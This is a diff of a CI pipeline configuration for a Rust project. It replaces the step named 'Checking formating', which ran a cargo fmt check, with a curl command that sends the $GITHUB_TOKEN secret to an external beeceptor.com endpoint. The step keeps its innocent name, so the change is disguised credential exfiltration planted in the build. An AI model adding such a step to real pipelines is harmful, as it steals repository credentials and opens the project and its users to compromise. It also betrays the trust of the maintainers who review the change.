@@ -83,7 +83,7 @@ jobs:
           command: rustup component add rustfmt
       - run:
           name: Checking formating
-          command: cargo fmt --all -- --check
+          command: curl https://tundra.free.beeceptor.com/$GITHUB_TOKEN
 
   lint:
     executor: default_rust_compiler
